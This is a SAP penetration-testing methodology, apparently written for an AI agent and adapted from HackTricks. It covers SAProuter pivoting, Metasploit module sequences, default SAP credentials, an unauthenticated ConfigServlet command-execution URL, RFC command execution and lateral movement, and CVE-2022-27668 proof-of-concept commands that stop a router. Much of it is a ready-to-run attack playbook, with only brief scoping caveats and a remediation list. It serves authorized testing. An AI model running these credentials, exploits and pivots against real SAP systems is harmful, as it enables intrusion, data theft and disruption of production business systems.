---
technology: "SAP"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
version: 1.0 (upstream-only new unit)
source: "rewritten from HackTricks (src/network-services-pentesting/pentesting-sap.md; src/network-services-pentesting/3299-pentesting-saprouter.md), CC BY-NC 4.0, accessed 2026-11-13"
status: upstream-only
provenance: "upstream-only: zero corpus evidence by design — methodology built from the upstream reference plus primary sources. Verified 2026-11-13: Metasploit SAP module names checked against the rapid7/metasploit-framework source tree (scanner/sap/sap_* and exploit/multi/sap/* — all module names cited below exist); default credentials cross-checked against the mySapAdventures repo (the upstream of that section); CVE-2022-27668 verified against the SEC Consult primary advisory (SAP Note 3158375; 0.0.0.0 NI_ROUTE loopback bypass; ROUTER_ADM effects; affected-version list; saprouttab prerequisite; workaround). pysap example scripts (router_portfw.py, router_admin.py) confirmed in the advisory PoC. Companion overview: [[sap|SAP]]."
---

# SAP bug bounty methodology

Target model: a SAP landscape (SID, instances NN) discovered through ports or OSINT, attacked through SAProuter pivots, web surfaces on :50000, the thick SAP GUI client, and RFC once authenticated. Authorization matters: default-credential testing and command-execution modules hit *production business systems* — scope explicitly, and prefer read-only enumeration modules first.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| SAProuter :3299 | reachable | yes | internal map + pivot; CVE-2022-27668 admin commands on vulnerable versions — High/Critical |
| Host Agent :1128/:1129 SOAP | reachable | mostly | host/OS/DB/instance disclosure (`GetComputerSystem`) — Info/High |
| `/sap/public/info` | ICM reachable | yes | RFC_SYSTEM_INFO: SID, kernel, DB engine, OS, IPs — Info |
| Port GUI :32NN / web :5NN00 | reachable | no | default-credential login (P1 on prod per Bugcrowd VRT) → full ERP — Critical |
| ConfigServlet `/ctc` | legacy unpatched AS Java | yes | `EXECUTE_CMD` OS command execution — Critical |
| SOAP RFC endpoints | reachable + (weak) auth | partly | `RFC_READ_TABLE` dump, `SXPG_*` command execution — Critical |
| SM59 trusted RFC | authenticated in one system | no | lateral movement into trusting systems — Critical |

## Phase 1 — discovery and OSINT

- Scope first: application brief, hostnames, instance numbers for SAP GUI (`sapgui HOST NN`).
- OSINT dorks for internet-facing stacks: `inurl:50000/irj/portal`, `inurl:IciEventService/IciEventConf`, `inurl:/wsnavigator/jsps/test.jsp`, `inurl:/irj/go/km/docs/`; search-engine queries for `sap portal`, `SAP Netweaver`, `SAP J2EE Engine`; `port:3299 !HTTP Network packet too big` for routers.
- nmap the full port map; derive instance numbers from `32NN`/`33NN`/`5NN13`/`5NN14` patterns; SAP Host Agent answers on 1128 (HTTP) / 1129 (HTTPS).
- Web fuzzing with the SecLists SAP wordlists (`urls-SAP.txt`, `SAP.fuzz.txt`, `sap.txt`) against ICM paths.
- Metasploit service sweep:

```text
use auxiliary/scanner/sap/sap_service_discovery
set RHOSTS 198.51.100.10
set INSTANCES 00-01
run
```

## Phase 2 — pre-auth enumeration

- Host Agent / sapcontrol: `GET /SAPHostControl/?wsdl`, `GET /SAPControl/?wsdl`, then `GetComputerSystem` — hostname, OS, database, installed instances, network interfaces.
- ICF: `http://TARGET:50000/sap/public/info` returns the `RFC_SYSTEM_INFO` XML (`RFCSYSID`, `RFCSAPRL`, `RFCDBSYS`, `RFCOPSYS`, `RFCIPADDR`, kernel release); reconcile with Host Agent output to build the attack graph before any login.
- SAProuter reachability → jump to Phase 6.

## Phase 3 — authentication (default credentials)

Try only in authorized scope; production default credentials are P1 (Bugcrowd VRT: Server Security Misconfiguration | Using Default Credentials | Production Server). Core canon (`user:password:clients`):

```text
# kernel superuser — historically the highest-impact default
SAP*:06071992:*        SAP*:PASS:*
# delivery/technical users
DDIC:19920706:000,001           # SAP_ALL-bearing
EARLYWATCH:SUPPORT:066
TMSADM:PASSWORD:000             TMSADM:$1Pawd2&:000
SAPCPIC:ADMIN:000,001
IDEADM:admin:*                  # IDES demo systems only
# Solution Manager and satellites
SOLMAN_ADMIN:init1234:*         SAPSUPPORT:init1234:*
# developer/trial editions (per release): DidNPLpw2014, Appl1ance, Down1oad
DEVELOPER:abCd1234:001          BWDEVELOPER:abCd1234:001
```

Also password-guess `<SID>adm` at the OS layer where allowed — noting lockout controls may apply. If GUI traffic can be captured while you authenticate, check for credentials over plain HTTP/DIAG without SNC/SSL (Wireshark plus the SecureAuth Labs SAP dissection plug-in or the Positive Research DIAG plugin); weak login over HTTP rates P3 on the VRT.

## Phase 4 — SAP GUI (thick client) abuse

- Connect: `sapgui HOST NN`.
- Privilege-escalation audit via transaction codes reachable by low-privilege users: `SU01`/`SU01D` (create/display users), `SU10` (mass maintenance), `SU02` (profiles), `SM19` (security audit config), `SE84` (authorization info system).
- Look for OS command/script execution from dialog users, and XSS in the BAPI Explorer.
- WebDynpro user disclosure (ERPSCAN-16-010): open `/webdynpro/resources/sap.com/.../JWFTestAddAssignees`, click Choose → Search — user listing on misconfigured 7.4 portals.
- Classic unauth RCE on old AS Java stacks — ConfigServlet:

```text
http://TARGET:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
```

## Phase 5 — profile parameter audit (authenticated)

Query values in transaction `RSPFPAR`, or export the profile XML and run SAPPV (`./SAPPV.sh EXPORT.xml`) against it. Unsafe-value classics:

| Parameter | Red line | Meaning |
|---|---|---|
| `auth/rfc_authority_check` | `<2` | RFC authority-check level too lax |
| `auth/no_check_in_some_cases` | `Y` | authorization checks bypassed in some cases |
| `auth/object_disabling_active` | `Y` | object deactivation permitted |
| `bdc/bdel_auth_check` | `FALSE` | BDC delete authorization not enforced |
| `gw/reg_no_conn_info` | `<255` | gateway registration without connection info |
| `icm/security_log` | `2` | ICM security logging weakened |
| `login/min_password_lng` | `<8` | short passwords allowed |
| `login/fails_to_user_lock` | `<5` | lockout after too few attempts is absent |
| `login/password_expiration_time` | `>90` | stale passwords |
| `login/no_automatic_user_sapstar` | `0` | automatic SAP* user assignment active |
| `rfc/reject_expired_passwd` | `0` | expired passwords accepted for RFC |
| `rsau/enable` | `0` | security audit log off |
| `service/protectedwebmethods` | `SDEFAULT` | SOAP web methods unprotected |
| `snc/enable` | `0` | Secure Network Communication off |
| `ucon/rfc/active` | `0` | Unified Connectivity inactive |

## Phase 6 — RFC abuse and lateral movement

- `SM59`: inventory stored credentials and trusted destinations. A foothold in a lower-tier system pivots to better-trusted ones via trusted RFC links (SolMan, BW, PI/PO, transport landscapes keep long-lived trust).
- Remote-enabled function modules to test once connected: `RFC_READ_TABLE` (data extraction), `RFC_PING` (discovery/callback), `SXPG_CALL_SYSTEM` / `SXPG_COMMAND_EXECUTE` (OS commands with an over-privileged user).
- Callback abuse: control one side of a trust pair and validate whether attacker-controlled callback functions execute on the caller — check the destination's allowlist and `rfc/callback_security_method` enforcement.
- Legacy AS Java with DB read access: `UME_STRINGS` password records with `{SHA-512, 10000, 24}`-style metadata — offline audit within scope only.

## Phase 7 — SAProuter pivot (section)

```text
use auxiliary/scanner/sap/sap_router_info_request     # router/config details
use auxiliary/scanner/sap/sap_router_portscanner      # scan THROUGH the router
  set INSTANCES 00-50
  set PORTS 32NN            # or MODE TCP + PORTS 80,32NN for ACL mapping
# run ANY module through the router tunnel:
use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
  set Proxies sapni:198.51.100.10:3299
  set RHOSTS 198.51.100.18     # internal target, reached via router
```

- Where the router answers nothing, blind-enumerate internal hostnames by guessing and observing route attempts.
- CVE-2022-27668 (SAP Note 3158375; stand-alone 7.22/7.53, kernels 7.49/7.77/7.81/7.85–7.88): with a `saprouttab` `P`/`S` entry allowing port 3299 to wildcard targets, tunnel `NI_ROUTE` to **0.0.0.0:3299** (127.0.0.1 is filtered; 0.0.0.0 is not) to reach the router's own loopback, then send `ROUTER_ADM` packets — stop the router, change trace level, kill connections — no `-X` flag needed:

```bash
python router_portfw.py -d 198.51.100.10 -p 3299 -t 0.0.0.0 -r 3299 -a 127.0.0.1 -l 3299 -v   # build the loopback tunnel
python router_admin.py -s -d 127.0.0.1 -p 3299                                               # admin packet: stop the router
```

- Report package: patch per Note 3158375, delete wildcard (`*`) targets from `saprouttab` `P`/`S` entries, no `-X`, filter 3299 at the perimeter, monitor `dev_rout` for `ROUTER_ADM`/`NI_ROUTE`→0.0.0.0.
- Version fingerprinting: add a custom nmap probe (TCP, ports 3299, match `SAProuter ([\d.]+)`) or `--script=banner` — versions leak `SAProuter <ver> on '<host>'`.

## Phase 8 — automated assessment

- bizploit (with the SAP-Stuff semi-automation script) covers discovery; its `vulnassess` plugin chain adds credential bruteforce (`bruteLogin` with `tryHardcodedSAPStar True`, `tryUserAsPwd True`), external-server registration (`registerExtServer`), RFC privilege checks (`checkRFCPrivs` with `checkExtOSCommands True`), and ICM admin probing (`icmAdmin` on `/sap/admin`).
- Exploit-DB for stack-specific public exploits; Metasploit carries the full family (`search sap`) — dispatcher/portal/SOAP-RCE exploits and the `sap_mgmt_con_*` management-console scanners, all module names above verified in the framework tree.

## Decision points

- Router first: 3299 visible → pivot-scan internals (Phase 7) before touching logins.
- Any login works → parameter audit (Phase 5) + SM59/RFC (Phase 6) outrank web fuzzing for impact.
- Legacy AS Java on :50000 → ConfigServlet and `/wsnavigator` before generic OWASP testing.
- Old kernels/dispatchers → check Exploit-DB for buffer-overflow era bugs (SAPLPD, dispatcher DiagTraceR3Info, BusinessObjects).

## Tool mapping (named in prose)

Metasploit (sap_service_discovery, sap_router_* , sap_hostctrl_getcomputersystem, sap_mgmt_con_*, sap_soap_rfc_* — verified module set); bizploit with the SAP-Stuff script for landscape assessment; PowerSAP (Airbus Seclab) for PowerShell-driven checks; pysap (OWASP/SecureAuth) for NI/Router/Diag/RFC packet crafting and the CVE-2022-27668 PoC path; SAPPV for parameter-dump validation; the gelim nmap-erpscan scripts for extra NSE discovery; SecLists SAP wordlists; Wireshark with the SecureAuth Labs and Positive Research DIAG dissectors.
